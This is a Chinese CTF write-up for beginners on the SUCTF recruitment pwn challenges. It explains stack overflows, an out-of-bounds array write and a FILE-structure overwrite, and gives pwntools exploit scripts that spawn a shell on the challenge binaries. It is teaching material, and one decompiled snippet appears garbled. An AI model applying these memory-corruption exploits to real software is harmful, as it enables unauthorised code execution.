此次的SUCTF招新赛的PWN题一共有七题，难度算是逐步上升吧，写个稍微详细一点的WP，希望能给刚刚入门的萌新PWNer一点帮助
题目的名字被我统一改成了supwn1-7，对应这下面的七题，我也放到百度云上了：
链接：  
提取码：1ha2
# stack
这是一道基础的栈溢出的题目，通过[checksec](http://yunnigu.dropsec.xyz/2016/10/08/checksec%E5%8F%8A%E5%85%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/)可以看到该程序什么保护机制都没开，它是一个64位的小端序的elf程序，当然也可以通过file命令来查看程序的基本信息
    $ file supwn1
    supwn1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID [sha1] = b2842040168e718fe077a170b5ad273fbb0d28d6, not stripped
通过将程序拖入IDA中，可以看到它的反编译后的程序逻辑：
可以看到，该程序首先输出了一个字符串样式“suctf”，接着调用了read函数，向buf中读入0x30个字节
而在IDA中可以看到，buf的空间大小只有0x20个字节，这里明显造成的栈溢出，可以通过覆盖一个八字节ebp+一个八字节的跳转地址，实现控制程序的流程
另外有的时候，buf的栈空间大小并不能单纯的从上面的【rbp-20h】看出，它还可能是rsp寻址，得看【rsp+0h】，在这种情况下，可以使用gdb调试的一种插件---[GEF的pattern功能](https://gef.readthedocs.io/en/latest/commands/pattern/)来测出偏移的大小
就以这题为例子，我们打开gdb-gef：
首先创建一大串远远超过栈空间的字符串，然后输入进程序中：
不出意外的，可以看到程序崩溃了，然后我们用 `pattern find $rbp`命令去查找到rbp的偏移
可以发现，找到了偏移32，也就是0x20，是buf到rbp的距离
[GEF](https://gef.readthedocs.io)还有很多很实用的功能，具体可以去探索一下，另外还有类似的gdb插件：[pwndbg](https://github.com/pwndbg/pwndbg)
接着，我们找到了偏移，就需要写一个exp脚本进行利用漏洞从而拿到flag
这里可以看到，IDA中有个next_door函数，它直接调用了一个system(/bin/sh)函数，如果之前的栈溢出控制跳转能够跳转到这里，那么就能实现getshell，从而拿到flag
我写exp脚本一般是python+[pwntools](https://docs.pwntools.com/en/stable/)
这里直接放脚本吧，结合着注释应该可以理解
    #encoding:utf-8
    #!/upr/bin/env python
    from pwn import *#引入pwntools模块
    context.log_level = "debug"#设置调试模式，可以看到输入和输出的具体信息
    p=process("./supwn1")#打开该elf文件，这里我统一把原来题目的名字改了
    #如果是连接远程端则用：p.remote("ip",端口)
    binsh =0x400676#这是next_door函数的地址
    payload = "a"*0x20+"b"*0x08+p64(binsh)#构造好覆盖ebp和返回地址的字符串,p64()这个函数是pwntools提供的，具体可以看官方文档查它是什么功能
    p.send(payload)#发送该字符串
    p.interactive()#进行交互,获得shell
如果对栈溢出的了解还不是很多的话可以参考以下链接进行学习：
[手把手教你栈溢出从入门到放弃](https://zhuanlan.zhihu.com/p/25816426)
[CTF-WIKI](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/stack_intro/)
# basic-pwn
这一题整体上和上一题基本上没有区别吧，都是一个栈溢出，跳转到一个函数，就可以读出flag了
保护机制：只开了一个NX保护，问题不大
    Arch:     amd64-64-little
        RELRO:    Full RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x400000)
不同的是，这题用了scanf的方法，没有指定读多少个，读到\n即停止，
后门函数也不一样了
溢出的原理是一样的，就不过多的重复了，可以参照第一题拿来练习练习
这里直接贴exp：
    #encoding:utf-8
    #!/upr/bin/env python
    from pwn import *#引入pwntools模块
    context.log_level = "debug"#设置调试模式，可以看到输入和输出的具体信息
    p=process("./supwn2")#打开该elf文件，这里我统一把原来题目的名字改了
    #如果是连接远程端则用：p.remote("ip",端口)
    catflag = 0x401157
    payload = "a"*0x110+"b"*0x08+p64(catflag)#构造好覆盖ebp和返回地址的字符串
    p.send(payload)#发送该字符串
    p.interactive()#进行交互,获得shell
# babyarray
这题主要是利用了一个数组下标越界的漏洞
先检查一遍他的保护机制：还是和上一题一样
    Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x400000)
接着拖入IDA分析程序的逻辑
程序首先让你输入一个十进制整数v4，然后再让你往【4*v4 +0x6010a0】的地方输入一个十进制整数
这里可以看到v4的栈空间大小只有4个字节，而输入的又是一个十进制数，那么就没办法造成一个栈溢出控制程序的流程
继续看程序逻辑
输入完后，进行一个if判断，如果变量a为0的话，那么就会直接打印出flag，我们甚至不需要去控制程序的执行流程，双击一下a可以直接看到它所在的地址：是0x601068
只要让这个地方的值为0，那么我们就能得到flag了
从上面的输入逻辑可以发现，我们能控制【4 _v4 +0x6010a0】的值，只要让 `4_ v4
+0x6010a0=0x601068`我们就能使得a为0，也就是得让v4为-14，就可以了
于是这题只需要，先输入-14，然后再输入0，就可以得到flag了
# easy_overflow_file_structure
这题总的漏洞利用难度不是很大，但是发现溢出这个过程比较难，难点在于发现一个关键函数的漏洞，这比较考验个人的逆向能力
保护机制：
    Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x400000)
程序一开始是这样的：
    int __cdecl main(int argc, const char **argv, const char **envp)
    {
      char s; // [rsp+0h] [rbp-1F40h]
      init();
      fd = fopen("./readme.txt", "r");
      fgets(&s, 0x1F40, stdin);
      su_server(&s);
      fclose(fd);
      return 0;
    }
让你输入一大串东西，然后进入su_server函数
    char *__fastcall su_server(const char *a1)
    {
      unsigned int v1; // eax
      char v3; // [rsp+1Fh] [rbp-1h]
      v1 = time(0LL);
      srand(v1);
      v3 = rand() % 0x80;
      memset(&host, 0, 0x7FuLL);
      memset(&username, 0, 0x7FuLL);
      memset(&researchfield, 0, 0x7FuLL);
      rand_num1 = v3;
      rand_num2 = v3;
      rand_num3 = v3;
      if ( strncmp("GET / HTTP/1.1#", a1, 8uLL) )
        __assert_fail("!strncmp(getMethod,http_header,sizeof(getMethod))", "main.c", 0x59u, "su_server");
      lookForHeader("Host", a1, 0x1F40, &host, 0x7Fu);
      lookForHeader("Username", a1, 0x1F40, &username, 0x7Fu);
      lookForHeader("ResearchField", a1, 0x1F40, &researchfield, 0x7Fu);
      if ( rand_num1 != v3 || rand_num2 != v3 || rand_num3 != v3 )
      {
        if ( fd->_flags == 0xDEADBEEF )
        {//如果能覆盖掉 fd->_flags为0xDEADBEEF的话，就能getshell拿flag了
          puts("66666");
          secret();
        }
        fclose(fd);
        fflush(stderr);
        abort();
      }
      return response(&host, &username, &researchfield);
    }
    int secret()
    {
      puts("W0W~ I will be very glad if you join in Asuri~");
      puts("This is a easy version of my fsop challenge.");
      puts("If you want to know more about it,search for the classic technique \"fsop\".");
      return system("/bin/sh");
    }
这个函数的逻辑就是把输入的那一大段的字符串，当做一个http的请求，然后根据关键词`Host：xxxx#` `Username：xxxx#`
`ResearchField：xxxxx#`来区分三段字符串，分别把xxx内容放入bss段中对应的位置，xxx字符串长度不能超过127
处理这些操作的函数是lookForHeader：
    //lookForHeader(str, input, 0x1F40, &target, 0x7Fu)
      str_len = strlen(str);
      for ( i = 0; ; ++i )
      {
        result_len = 8000 - str_len;
        if ( result_len _flags == 0xDEADBEEF )
        {
          puts("66666");
          secret();
        }
        fclose(fd);
        fflush(stderr);
        abort();
      }
exp如下：
    #encoding:utf-8
    #!/upr/bin/env python
    from pwn import *
    context.log_level = "debug"
    bin_elf = "./supwn4"
    context.binary=bin_elf
    #libc = ELF("./libc-2.23.so")
    elf = ELF(bin_elf)
    libc = elf.libc
    if sys.argv[1] == "r":#在命令窗口中输入 python supwn4.py r 表示接入远程端的程序
        p = remote("4xxxxx3",10002)
    elif sys.argv[1] == "l":#在命令窗口中输入python supwn4.py l 表示本地进行调试
        p = process(bin_elf)
    #-------------------------------------    #定义这些函数是我个人比较偷懒的写法，因为懒得输入各种p.xxxx()
    def sl(s):
        return p.sendline(s)
    def sd(s):
        return p.send(s)
    def rc(timeout=0):
        if timeout == 0:
            return p.recv()
        else:
            return p.recv(timeout=timeout)
    def ru(s, timeout=0):
        if timeout == 0:
            return p.recvuntil(s)
        else:
            return p.recvuntil(s, timeout=timeout)
    def sla(p,a,s):
        return p.sendlineafter(a,s)
    def sda(a,s):
        return p.sendafter(a,s)
    def debug(addr=''):
        gdb.attach(p,'')
        pause()
    def getshell():
        p.interactive()
    #-------------------------------------    #gdb.attach(p)
    pause()
    payload = "GET / HTTP/1.1#"
    payload +="Host:"+"a"*0x7e+"#"
    payload +="Username:"+p64(0xDEADBEEF)+"#"
    payload +="ResearchField:"+"c"*0x7e+"#"
    payload +="ResearchField:"+"aa"+p64(0x6021A0)+"#"
    sl(payload)
    getshell()
# unlink